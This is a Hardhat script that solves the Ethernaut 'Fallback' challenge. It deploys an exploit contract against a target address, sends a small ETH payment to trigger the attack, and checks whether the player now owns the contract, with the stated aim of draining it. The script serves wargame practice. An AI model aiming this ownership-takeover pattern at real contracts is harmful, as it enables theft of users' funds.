const hre = require('hardhat');

async function main() {
  const [player] = await hre.ethers.getSigners();
  console.log('Exploiting with account:', player.address);

  // Ethernaut Fallback Challenge
  // Objective: Claim ownership and drain the contract
  
  const targetAddress = process.env.ETHERNAUT_FALLBACK;
  if (!targetAddress) {
    console.error('Set ETHERNAUT_FALLBACK in .env');
    return;
  }

  console.log('Target:', targetAddress);

  // Deploy exploit contract
  const FallbackExploit = await hre.ethers.getContractFactory('FallbackExploit');
  const exploit = await FallbackExploit.deploy(targetAddress);
  await exploit.deployed();
  console.log('Exploit deployed to:', exploit.address);

  // Execute attack
  console.log('Executing attack...');
  const tx = await exploit.attack({ value: hre.ethers.utils.parseEther('0.0002') });
  await tx.wait();
  console.log('Attack complete!');

  // Verify ownership
  const target = await hre.ethers.getContractAt('IFallback', targetAddress);
  const owner = await target.owner();
  console.log('New owner:', owner);
  console.log('Player address:', player.address);
  console.log('Success:', owner === player.address);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
